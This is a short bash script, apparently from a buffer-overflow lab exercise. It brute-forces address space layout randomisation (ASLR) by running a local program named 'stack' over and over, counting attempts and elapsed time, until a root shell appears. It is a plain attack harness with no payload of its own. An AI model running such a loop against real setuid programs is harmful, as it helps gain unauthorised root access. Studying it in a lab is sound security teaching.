#!/bin/bash

SECONDS=0
value=0

echo "=========================================="
echo "ASLR Brute Force Attack"
echo "=========================================="
echo "Starting attack..."
echo ""

while [ 1 ]
do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    
    echo "$min minutes and $sec seconds elapsed."
    echo "Attempt #$value"
    
    ./stack
    
    # If we get here, check if we got root
    # (The script will hang if we get a shell)
done